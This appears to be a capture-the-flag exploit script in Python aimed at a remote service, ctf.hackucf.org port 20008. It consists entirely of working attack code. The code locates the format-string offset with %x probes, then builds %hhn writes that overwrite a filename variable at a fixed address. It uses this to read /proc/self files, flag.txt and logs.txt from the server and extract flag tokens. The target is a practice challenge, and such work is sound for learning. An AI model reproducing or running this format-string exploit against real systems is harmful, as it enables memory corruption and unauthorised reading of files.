#!/usr/bin/env python3
import re
import socket
import struct

HOST = "ctf.hackucf.org"
PORT = 20008


def recv_all(s: socket.socket, limit: int = 2_000_000) -> bytes:
    s.settimeout(2.0)
    out = b""
    while True:
        try:
            d = s.recv(4096)
        except socket.timeout:
            break
        if not d:
            break
        out += d
        if len(out) >= limit:
            break
    return out


def query(payload: bytes) -> bytes:
    with socket.create_connection((HOST, PORT), timeout=3.0) as s:
        _ = recv_all(s)
        s.sendall(payload)
        return recv_all(s)


def find_base_idx(max_i: int = 400) -> int:
    target = b"41414141"
    start = 1
    step = 12
    while start <= max_i:
        idxs = list(range(start, min(start + step, max_i + 1)))
        fmt = "AAAA." + ".".join(f"%{i}$x" for i in idxs) + "\n"
        out = query(fmt.encode())
        if target in out:
            line = next(l for l in out.splitlines() if b"Searching for:" in l)
            after = line.split(b"AAAA.", 1)[1]
            fields = after.split(b".")
            vals = []
            for f in fields:
                if re.fullmatch(rb"[0-9a-fA-F]+", f):
                    vals.append(f.lower())
            for i, v in zip(idxs, vals):
                if v == target:
                    return i
        start += step
    raise RuntimeError("base_idx not found")


def build_payload(base_idx: int, filename: bytes) -> bytes:
    # Write filename bytes starting at search_file (0x804b370),
    # extending into .bss as needed, and terminate with NUL.
    if not filename.endswith(b"\x00"):
        filename += b"\x00"
    addrs = [0x0804B370 + i for i in range(len(filename))]
    prefix = b"".join(struct.pack("<I", a) for a in addrs)
    idxs = [base_idx + i for i in range(len(filename))]
    dummy = 6
    cur = len(prefix)
    fmt = ""
    for b, idx in zip(filename, idxs):
        pad = (b - (cur % 0x100)) % 0x100
        if pad:
            fmt += f"%{dummy}${pad}c"
            cur += pad
        fmt += f"%{idx}$hhn"
    # NUL-terminate our search phrase at buffer[0] (empty string matches everything)
    pad5 = (-cur) % 0x100
    if pad5:
        fmt += f"%{dummy}${pad5}c"
        cur += pad5
    fmt += f"%{dummy}$hhn"
    return prefix + fmt.encode() + b"\n"


def main() -> None:
    base = find_base_idx()
    print("base_idx", base)
    for name in [
        b"/proc/self/maps",
        b"/proc/self/cmdline",
        b"/proc/self/status",
        b"flag.txt",
        b"logs.txt",
    ]:
        out = query(build_payload(base, name))
        print("===", name, "len", len(out))
        # show last 10 lines
        lines = out.splitlines()[-10:]
        for l in lines:
            print(l.decode(errors="replace"))
        # dump all brace-ish tokens
        toks = sorted(set(m.group(0).decode(errors="replace") for m in re.finditer(rb"[A-Za-z0-9_]{0,10}\{[^}\n]{1,80}\}", out)))
        print("TOKENS", toks[:20])
        print()


if __name__ == "__main__":
    main()

